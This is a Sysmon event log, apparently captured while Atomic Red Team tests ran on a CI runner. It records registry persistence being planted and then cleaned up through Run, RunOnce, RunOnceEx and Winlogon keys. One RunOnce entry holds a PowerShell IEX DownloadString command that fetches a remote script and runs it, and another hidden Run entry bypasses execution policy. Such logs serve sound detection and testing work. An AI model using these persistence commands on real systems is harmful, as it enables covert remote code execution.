"12/17/2025 7:59:32 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:32.838
ProcessGuid: {f995aebf-62e4-6942-4d04-000000000e00}
ProcessId: 6776
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_brhgpcfz.nvi.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:32 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:32.817
ProcessGuid: {f995aebf-62e4-6942-4d04-000000000e00}
ProcessId: 6776
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_brhgpcfz.nvi.ps1
CreationUtcTime: 2025-12-17 07:59:32.817
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:32 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: DeleteValue
UtcTime: 2025-12-17 07:59:32.542
ProcessGuid: {f995aebf-62e4-6942-4c04-000000000e00}
ProcessId: 6648
Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend\1
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:32 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: DeleteValue
UtcTime: 2025-12-17 07:59:32.318
ProcessGuid: {f995aebf-62e4-6942-4904-000000000e00}
ProcessId: 8760
Image: C:\Windows\system32\reg.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Atomic Red Team
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:27 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 07:59:27.705
ProcessGuid: {f995aebf-5f79-6942-d300-000000000e00}
ProcessId: 7608
Image: C:\Windows\system32\sihost.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:27 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:59:27.490
ProcessGuid: {f995aebf-62df-6942-4104-000000000e00}
ProcessId: 10168
Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\System\CurrentControlSet\Control\BootVerificationProgram\ImagePath
Details: C:\Program Files\Internet Explorer\iexplore.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:27 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:27.484
ProcessGuid: {f995aebf-62df-6942-4104-000000000e00}
ProcessId: 10168
Image: C:\Windows\System32\reg.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Registry Console Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: reg.exe
CommandLine: reg  add HKLM\System\CurrentControlSet\Control\BootVerificationProgram /v ImagePath /t REG_SZ /d ""C:\Program Files\Internet Explorer\iexplore.exe""
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=EF37663B44AC66920C6F33694DEEA01ACB78AE3F3012884819373FA04C3EB5F0
ParentProcessGuid: {f995aebf-62df-6942-3f04-000000000e00}
ParentProcessId: 3364
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c reg add HKLM\System\CurrentControlSet\Control\BootVerificationProgram /v ImagePath /t REG_SZ /d ""C:\Program Files\Internet Explorer\iexplore.exe""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:27 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:27.461
ProcessGuid: {f995aebf-62df-6942-3f04-000000000e00}
ProcessId: 3364
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c reg add HKLM\System\CurrentControlSet\Control\BootVerificationProgram /v ImagePath /t REG_SZ /d ""C:\Program Files\Internet Explorer\iexplore.exe""
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:26 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:26.741
ProcessGuid: {f995aebf-62de-6942-3904-000000000e00}
ProcessId: 6372
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_cwd4suqm.ipm.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:26 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:26.719
ProcessGuid: {f995aebf-62de-6942-3904-000000000e00}
ProcessId: 6372
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_cwd4suqm.ipm.ps1
CreationUtcTime: 2025-12-17 07:59:26.719
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:26 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:59:26.399
ProcessGuid: {f995aebf-5f5c-6942-0c00-000000000e00}
ProcessId: 972
Image: C:\Windows\system32\services.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\calc
Details: calc.exe
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:59:26 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 07:59:26.397
ProcessGuid: {f995aebf-5f5c-6942-0c00-000000000e00}
ProcessId: 972
Image: C:\Windows\system32\services.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:59:26 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:59:26.395
ProcessGuid: {f995aebf-5f5c-6942-0c00-000000000e00}
ProcessId: 972
Image: C:\Windows\System32\services.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:59:26 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:26.272
ProcessGuid: {f995aebf-5f5c-6942-0c00-000000000e00}
ProcessId: 972
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\system32\services.exe
TargetFilename: C:\Windows\security\logs\scesrv.log
Hashes: SHA256=E82D56D9767E6F64B0A0FA1DC846B4D32B083638DB7D280EA2967E46D4EF1FAD
IsExecutable: false
Archived: true"
"12/17/2025 7:59:25 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:59:25.662
ProcessGuid: {f995aebf-62dd-6942-3304-000000000e00}
ProcessId: 1836
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
Details: explorer.exe, C:\Windows\explorer.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:25 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:59:25.658
ProcessGuid: {f995aebf-62dd-6942-3304-000000000e00}
ProcessId: 1836
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell-backup
Details: explorer.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:25 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:25.465
ProcessGuid: {f995aebf-62dd-6942-3304-000000000e00}
ProcessId: 1836
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_umntntlw.oyi.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:25 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:25.444
ProcessGuid: {f995aebf-62dd-6942-3304-000000000e00}
ProcessId: 1836
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_umntntlw.oyi.ps1
CreationUtcTime: 2025-12-17 07:59:25.444
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:25 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:59:25.128
ProcessGuid: {f995aebf-62dc-6942-3104-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
Details: C:\Windows\system32\userinit.exe, C:\Windows\System32\calc.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:25 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:59:25.124
ProcessGuid: {f995aebf-62dc-6942-3104-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit-backup
Details: C:\Windows\system32\userinit.exe,
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:24 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:24.934
ProcessGuid: {f995aebf-62dc-6942-3104-000000000e00}
ProcessId: 3368
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_4uxsnyai.gyh.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:24 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:24.913
ProcessGuid: {f995aebf-62dc-6942-3104-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_4uxsnyai.gyh.ps1
CreationUtcTime: 2025-12-17 07:59:24.913
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:24 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:24.246
ProcessGuid: {f995aebf-62dc-6942-2f04-000000000e00}
ProcessId: 9700
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_zvpwza55.wen.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:24 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:24.223
ProcessGuid: {f995aebf-62dc-6942-2f04-000000000e00}
ProcessId: 9700
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_zvpwza55.wen.ps1
CreationUtcTime: 2025-12-17 07:59:24.223
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:23 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:23.550
ProcessGuid: {f995aebf-62db-6942-2d04-000000000e00}
ProcessId: 6424
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_tpjisvo5.nyw.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:23 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:23.530
ProcessGuid: {f995aebf-62db-6942-2d04-000000000e00}
ProcessId: 6424
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_tpjisvo5.nyw.ps1
CreationUtcTime: 2025-12-17 07:59:23.530
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:23 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:23.207
ProcessGuid: {f995aebf-62da-6942-2b04-000000000e00}
ProcessId: 6976
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\atomictest\calc.exe
CreationUtcTime: 2025-12-17 07:59:22.608
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:23 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:23.207
ProcessGuid: {f995aebf-62da-6942-2b04-000000000e00}
ProcessId: 6976
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\atomictest\calc.exe
Hashes: SHA256=81BD48985FA1753E9E2158A7CF969141EDDDBD050E976801BB477E24A2A06B2A
IsExecutable: false
Archived: true"
"12/17/2025 7:59:22 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:22.961
ProcessGuid: {f995aebf-62da-6942-2b04-000000000e00}
ProcessId: 6976
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_fn3xaokb.pnn.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:22 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:22.940
ProcessGuid: {f995aebf-62da-6942-2b04-000000000e00}
ProcessId: 6976
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_fn3xaokb.pnn.ps1
CreationUtcTime: 2025-12-17 07:59:22.940
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:22 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:22.608
ProcessGuid: {f995aebf-62da-6942-2904-000000000e00}
ProcessId: 4512
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\atomictest\calc.exe
CreationUtcTime: 2025-12-17 07:59:22.608
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:22 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:22.405
ProcessGuid: {f995aebf-62da-6942-2904-000000000e00}
ProcessId: 4512
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_qruehydw.bvb.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:22 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:22.383
ProcessGuid: {f995aebf-62da-6942-2904-000000000e00}
ProcessId: 4512
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_qruehydw.bvb.ps1
CreationUtcTime: 2025-12-17 07:59:22.383
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:22 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:59:22.066
ProcessGuid: {f995aebf-62d9-6942-2704-000000000e00}
ProcessId: 9104
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\socks5_powershell
Details: powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:21 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:21.886
ProcessGuid: {f995aebf-62d9-6942-2704-000000000e00}
ProcessId: 9104
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_hj3peqq4.k5m.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:21 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:21.864
ProcessGuid: {f995aebf-62d9-6942-2704-000000000e00}
ProcessId: 9104
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_hj3peqq4.k5m.ps1
CreationUtcTime: 2025-12-17 07:59:21.863
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:20 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:20.929
ProcessGuid: {f995aebf-62d8-6942-2204-000000000e00}
ProcessId: 6196
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_x4xvxswq.and.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:20 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:20.897
ProcessGuid: {f995aebf-62d8-6942-2204-000000000e00}
ProcessId: 6196
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_x4xvxswq.and.ps1
CreationUtcTime: 2025-12-17 07:59:20.897
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:20 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:20.084
ProcessGuid: {f995aebf-62d7-6942-1804-000000000e00}
ProcessId: 1004
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_gtxfjuj0.4ny.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:20 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:20.062
ProcessGuid: {f995aebf-62d7-6942-1804-000000000e00}
ProcessId: 1004
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_gtxfjuj0.4ny.ps1
CreationUtcTime: 2025-12-17 07:59:20.060
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:19 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:19.447
ProcessGuid: {f995aebf-62d7-6942-1404-000000000e00}
ProcessId: 9612
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_nyiato50.uhm.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:19 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:19.425
ProcessGuid: {f995aebf-62d7-6942-1404-000000000e00}
ProcessId: 9612
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_nyiato50.uhm.ps1
CreationUtcTime: 2025-12-17 07:59:19.425
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:18 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:18.813
ProcessGuid: {f995aebf-62d6-6942-1004-000000000e00}
ProcessId: 4276
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_e3daawqk.szc.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:18 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:18.793
ProcessGuid: {f995aebf-62d6-6942-1004-000000000e00}
ProcessId: 4276
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_e3daawqk.szc.ps1
CreationUtcTime: 2025-12-17 07:59:18.793
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:18 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:59:18.475
ProcessGuid: {f995aebf-62d6-6942-0e04-000000000e00}
ProcessId: 6984
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\NextRun
Details: powershell.exe ""IEX (New-Object Net.WebClient).DownloadString(`""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`"")""
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:18 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:18.295
ProcessGuid: {f995aebf-62d6-6942-0e04-000000000e00}
ProcessId: 6984
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_r1nt24bn.r1o.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:18 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:18.271
ProcessGuid: {f995aebf-62d6-6942-0e04-000000000e00}
ProcessId: 6984
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_r1nt24bn.r1o.ps1
CreationUtcTime: 2025-12-17 07:59:18.271
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:18 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:18.185
ProcessGuid: {f995aebf-62d6-6942-0e04-000000000e00}
ProcessId: 6984
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {$RunOnceKey = \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce\""""
set-itemproperty $RunOnceKey \""""NextRun\"""" 'powershell.exe \""""IEX (New-Object Net.WebClient).DownloadString(`\""""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\"""")\""""'}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:17 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:59:17.959
ProcessGuid: {f995aebf-62d5-6942-0d04-000000000e00}
ProcessId: 2712
Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend\1
Details: C:\Path\AtomicRedTeam.dll
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:17 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 07:59:17.959
ProcessGuid: {f995aebf-62d5-6942-0d04-000000000e00}
ProcessId: 2712
Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:17 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 07:59:17.959
ProcessGuid: {f995aebf-62d5-6942-0d04-000000000e00}
ProcessId: 2712
Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:17 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 07:59:17.958
ProcessGuid: {f995aebf-62d5-6942-0d04-000000000e00}
ProcessId: 2712
Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:17 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:59:17.703
ProcessGuid: {f995aebf-62d5-6942-0a04-000000000e00}
ProcessId: 704
Image: C:\Windows\system32\reg.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Atomic Red Team
Details: C:\Path\AtomicRedTeam.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:17 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 07:59:17.703
ProcessGuid: {f995aebf-62d5-6942-0a04-000000000e00}
ProcessId: 704
Image: C:\Windows\system32\reg.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:15 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:15.995
ProcessGuid: {f995aebf-62d3-6942-0404-000000000e00}
ProcessId: 5840
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
